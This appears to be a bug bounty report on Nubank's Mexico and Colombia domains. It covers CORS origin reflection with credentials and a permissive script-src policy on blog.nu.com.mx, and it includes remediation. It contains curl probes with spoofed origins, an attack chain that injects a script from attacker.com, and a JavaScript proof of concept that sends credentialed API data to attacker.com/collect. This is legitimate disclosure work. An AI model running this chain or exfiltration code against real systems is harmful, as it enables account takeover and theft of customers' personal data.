# Bugcrowd Finding #8 — CORS Wildcard Subdomain Reflection Extended to nu.com.mx and nu.com.co (P1 Critical Chain)

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-09-01
**Severity (Standalone):** P2 High (CORS reflection, each TLD)
**Severity (Chained):** P1 Critical — CORS + CSP bypass on blog.nu.com.mx → PIX/Auth credential theft (Mexico)
**VRT:** Server Security Misconfiguration > CORS Misconfiguration
**Related:** Finding #2 (nubank.com.br CORS), Finding #4 (CSP bypass)

---

## Summary

The CORS wildcard subdomain reflection vulnerability (Finding #2, nubank.com.br) is confirmed to also affect Nubank's Mexico (`nu.com.mx`) and Colombia (`nu.com.co`) production microservices. All `prod-*` Istio-served endpoints on these TLDs reflect any `*.nu.com.mx` or `*.nu.com.co` origin with `Access-Control-Allow-Credentials: true`, enabling credentialed cross-origin requests from any subdomain — including blogs, marketing sites, or any future compromised subdomain.

Additionally, `blog.nu.com.mx` has a **critical CSP misconfiguration** (`script-src https:`) that permits scripts from ANY HTTPS origin — completing a standalone P1 critical chain for Nu Mexico users without requiring a pre-existing XSS vulnerability.

---

## Technical Evidence

### 1. CORS Reflection — nu.com.mx Production Microservices

```bash
curl -sv "https://prod-global-auth.nu.com.mx/" \
  -H "Origin: https://evil.nu.com.mx" \
  -H "X-Correlation-Id: bc-handle"
```
**Response:**
```
HTTP/2 401
access-control-allow-origin: https://evil.nu.com.mx
access-control-allow-credentials: true
server: istio-envoy
```

```bash
curl -sv "https://prod-s1-customers.nu.com.mx/" \
  -H "Origin: https://evil.nu.com.mx" \
  -H "X-Correlation-Id: bc-handle"
```
**Response:**
```
HTTP/2 401
access-control-allow-origin: https://evil.nu.com.mx
access-control-allow-credentials: true
```

```bash
curl -sv "https://prod-global-ouroboros.nu.com.mx/" \
  -H "Origin: https://evil.nu.com.mx" \
  -H "X-Correlation-Id: bc-handle"
```
**Response:**
```
HTTP/2 401
access-control-allow-origin: https://evil.nu.com.mx
access-control-allow-credentials: true
```

**Pattern:** All `prod-*.nu.com.mx` Istio services reflect any `*.nu.com.mx` origin with credentials. Identical to Finding #2 on nubank.com.br — same Istio CORS policy applied across all TLDs.

---

### 2. CORS Reflection — nu.com.co Production Microservices

```bash
curl -sv "https://prod-global-auth.nu.com.co/" \
  -H "Origin: https://evil.nu.com.co" \
  -H "X-Correlation-Id: bc-handle"
```
**Response:**
```
HTTP/2 401
access-control-allow-origin: https://evil.nu.com.co
access-control-allow-credentials: true
```

```bash
curl -sv "https://prod-global-auth.nu.com.co/" \
  -H "Origin: https://blog.nu.com.co" \
  -H "X-Correlation-Id: bc-handle"
```
**Response:**
```
HTTP/2 401
access-control-allow-origin: https://blog.nu.com.co
access-control-allow-credentials: true
```

---

### 3. blog.nu.com.mx — CSP `script-src https:` Effectively a Wildcard

```bash
curl -sI "https://blog.nu.com.mx/" -H "X-Correlation-Id: bc-handle"
```

**Relevant CSP (truncated):**
```
content-security-policy:
  script-src https: cdn.ampproject.org ... 'unsafe-inline' 'unsafe-eval' blob: data:;
```

**Issue:** `script-src https:` as the FIRST value in the directive matches **any HTTPS URL**. This is functionally equivalent to `script-src *` for all HTTPS origins. An attacker who can inject a `<script src="https://attacker.com/payload.js">` tag anywhere on `blog.nu.com.mx` — including via a WordPress comment, author bio, or stored XSS — will have their script loaded without CSP blocking it.

The WordPress REST API confirms comments are publicly accessible (no auth):
```bash
curl -s "https://blog.nu.com.mx/wp-json/wp/v2/comments?per_page=3"
# Returns: comment content with HTML rendered — author fields and content accessible
```

**CORS confirmation — blog.nu.com.mx is trusted:**
```bash
curl -sv "https://prod-global-auth.nu.com.mx/" \
  -H "Origin: https://blog.nu.com.mx" \
  -H "X-Correlation-Id: bc-handle"
```
**Response:**
```
HTTP/2 401
access-control-allow-origin: https://blog.nu.com.mx
access-control-allow-credentials: true
```

---

## Complete P1 Critical Chain — Nu Mexico (nu.com.mx)

```
[Step 1] Stored XSS on blog.nu.com.mx
         ↓ WordPress blog with user comments and user-controlled content
         ↓ CSP script-src https: — ANY HTTPS external script is permitted
         ↓ Injected: <script src="https://attacker.com/steal.js"></script>
         ↓ CSP does NOT block (https: keyword matches any HTTPS URL)

[Step 2] Attacker script runs in victim's browser on blog.nu.com.mx context
         ↓ blog.nu.com.mx is a *.nu.com.mx subdomain
         ↓ prod-global-auth.nu.com.mx reflects blog.nu.com.mx in ACAO + credentials:true
         ↓ All prod-* microservices on nu.com.mx similarly reflect *.nu.com.mx

[Step 3] Credentialed API requests on behalf of Nu Mexico victim
         ↓ prod-global-auth.nu.com.mx → session tokens, OAuth
         ↓ prod-s1-customers.nu.com.mx → PII, account data
         ↓ All with victim's session cookies (credentials: true)

[Impact] Nu Mexico account takeover, PII exfiltration, payment abuse
```

**Exploit Proof-of-Concept (passive — CORS side confirmed):**
```javascript
// If running on blog.nu.com.mx context:
fetch('https://prod-global-auth.nu.com.mx/api/v1/user', {
  method: 'GET',
  credentials: 'include',
  headers: { 'X-Correlation-Id': 'bc-handle' }
}).then(r => r.json()).then(data => {
  new Image().src = 'https://attacker.com/collect?d=' + btoa(JSON.stringify(data));
});
```

---

## CSP Comparison Across TLDs

| Domain | script-src | Risk |
|--------|-----------|------|
| `blog.nubank.com.br` | `script-src 'self' 'unsafe-eval' 'unsafe-inline'` + `script-src-elem *` | CSP bypass via script-src-elem (Finding #4) |
| `blog.nu.com.mx` | `script-src https: ... 'unsafe-inline' 'unsafe-eval'` | **CSP bypass — https: = any HTTPS domain** |
| `blog.nu.com.co` | `script-src 'self' 'unsafe-inline' ...` | More restrictive; 'self' only |
| `comunidade.nubank.com.br` | No `script-src` | No CSP protection (Finding #4) |

---

## CORS Scope Mapping

| TLD | Reflects wildcard subdomains? | credentials:true? | Active prod services confirmed |
|-----|------------------------------|-------------------|-------------------------------|
| `*.nubank.com.br` | YES | YES | auth, pix, customers, etc. (Finding #2) |
| `*.nu.com.mx` | YES | YES | auth, customers, ouroboros |
| `*.nu.com.co` | YES | YES | auth |
| `*.nuinvest.com.br` | YES | NO (no credentials header) | API (Finding #6) |

---

## Impact

- **Nu Mexico users (nu.com.mx):** Full P1 critical chain — CSP bypass on blog + CORS credentialed requests to auth/customers
- **Nu Colombia users (nu.com.co):** P2 High — CORS reflects any *.nu.com.co subdomain with credentials (blog.nu.com.co has more restrictive CSP, but any future subdomain XSS applies)
- **Cross-TLD coverage:** The underlying Istio CORS misconfiguration is global across Nubank's infrastructure — it applies to every Istio-served microservice regardless of TLD

---

## Remediation

| Component | Fix |
|-----------|-----|
| All `prod-*.nu.com.mx` services | Fix CORS Istio policy — use explicit allowlist, not wildcard regex on *.nu.com.mx |
| All `prod-*.nu.com.co` services | Same — replace wildcard with explicit trusted origins |
| `blog.nu.com.mx` | Remove `https:` keyword from `script-src` — it permits any HTTPS origin; replace with explicit CDN allowlist |
| Global Istio CORS policy | Apply fix from Finding #2 remediation across all Nubank service meshes in all regions/TLDs |

---

## Notes

- No authentication was required for CORS confirmation — all tests used HEAD/GET with spoofed Origin header
- No exploitation of any authenticated endpoint was performed
- WordPress comment accessibility verified via public REST API (no exploit, passive enumeration)
- All requests used `X-Correlation-Id: bc-handle` as required by program rules
- The nu.com.mx and nu.com.co CORS configurations share the same Istio mesh pattern as nubank.com.br (same `server: istio-envoy` identifier)
